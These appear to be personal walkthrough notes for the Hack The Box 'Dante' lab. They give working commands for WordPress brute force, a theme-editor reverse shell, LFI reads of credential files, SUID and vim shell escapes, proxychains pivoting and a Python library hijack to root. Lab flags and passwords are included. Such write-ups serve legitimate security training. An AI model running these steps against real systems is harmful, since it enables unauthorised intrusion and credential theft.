```bash
# init scan
nmap -T4 -n 10.10.110.0/24 -oN active-hosts

# full port scan
nmap -Pn -T4 -sC -sV -p- -oA nmap/nmap-dante-fullport 10.10.110.100
```
![[Pasted image 20230121133025.png]]
```bash
# login via anon ftp and pull todo.txt for info
# first flag : DANTE{Y0u_Cant_G3t_at_m3_br0!}

# wordpress discovered on port 65000
http://10.10.110.100:65000/wordpress

# wpscan to enum users
wpscan -e u --url http://10.10.110.100:65000/wordpress
```
![[Pasted image 20230121133912.png]]
```bash
# James has weak password (found from todo.txt)
http://10.10.110.100:65000/wordpress/.wp-config.php.swp (?)

# search for names 
james
kevin
kalthazar
aj
nathan
# ceWL to create wordlist
cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks > words.txt
# brute force password with wpscan
wpscan -U names.txt -P words.txt --url http://10.10.110.100:65000/wordpress


```
![[Pasted image 20230121135731.png]]
```bash
# login : http://10.10.110.100:65000/wordpress/wp-admin
james : Toyota
# Go to apperance > themes to edit phpcode for rev shell
# select twenty nineteen
nc -lvnp 8888 # listener
curl http://10.10.110.100:65000/wordpress/wp-content/themes/twentynineteen/404.php

# upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# ctrl z 
stty raw -echo 
# fg
export TERM=xterm
# Shell upgraded

# www-data user cannot access james' home folder - try su to james 
su james (passwd Toyota)
# Flag 2 : DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}

# linpeas.sh to enumerate 
```
![[Pasted image 20230121174257.png]]
```bash
# currently cant use these creds, keep up enumeration
find / -perm -4000 2>/dev/null
# permissions on "find" binary are incorrect (suid bit set)
find . -exec /bin/bash -p \; -quit

# now on a new network, ping sweep script: 
for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep "bytes from" | cut -d ' ' -f4 | tr -d ':' &);done

### 
172.16.1.5
172.16.1.10
172.16.1.12
172.16.1.13
172.16.1.17
172.16.1.19
172.16.1.100
172.16.1.101
172.16.1.102
172.16.1.20
###

# add public ssh key to /root/.ssh/authorized_keys 
# then ssh into machine with 
ssh -i ~/.ssh/id_rsa -D 1337 root@10.10.110.100

# edit /etc/proxychains.conf of your LOCAL machine
# add below line 
socks5 127.0.0.1 1337 
# nmap scan through proxychains 
# nmap is not proxy aware so -sT option is used instead
proxychains nmap 172.16.1.10 -sT -sV -Pn -T5
```
![[Pasted image 20230121181245.png]]
- will throw a bunch of errors
```bash
proxychains firefox
```
![[Pasted image 20230121182146.png]]
- page = maybe vulnerable to LFI 
```bash
# test for LFI
http://172.16.1.10/nav.php?page=../../../../../../../../../../../etc/passwd
```
![[Pasted image 20230121182409.png]]
- non-default names discovered 

```bash
# testing other ports
proxychains smbclient -N -L //172.16.1.10
```
![[Pasted image 20230121182606.png]]
```bash
# non-default share
proxychains smbclient -N \\\\172.16.1.10\\SlackMigration
get admintasks.txt


```
![[Pasted image 20230121182816.png]]
```bash
# using our lfi to access otherwise hidden files

http://172.16.1.10/nav.php?page=/var/www/html/wordpress/index.php
# Nothing showed, use php filter 
http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php

base64 -d base64-file > wp-config.php

```

![[Pasted image 20230121184141.png]]

```bash
# creds for margaret 
margaret : Welcome1!2@3# 

proxychains ssh margaret@172.16.1.10
# creds worked

# limited shell can only use vim 
# open vim then go to gtfobins 
:set shell=/bin/bash
:shell
# successfully escaped limited shell

cd ~/.config/Slack/exported_data
"text": "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username",

su frank # TractorHeadtorchDeskmat

cd /home/frank
```
```python
# script found
import call
import urllib
url = urllib.urlopen(localhost)
page= url.getcode()
if page ==200:
        print ("We're all good!")
else:
        print("We're failing!")
        call(["systemctl start apache2"], shell=True)
```

```bash
# restart apache script is owned by root but not writable by frank 
# the fact there is no while loop hints to cronjob 
# check with pspy tool, file named urllib.py is being created
# create new file with that name in frank home directory
```
```python 
# keep an eye on /tmp/sh
import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
```
![[Pasted image 20230121185522.png]]
```bash 
# /tmp/sh is created after a few minutes and has the stickybit
/tmp/sh -p # -p to keep permissions of file
# now root :)
# DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}
```
![[Pasted image 20230121191939.png]]
- next target

```bash

```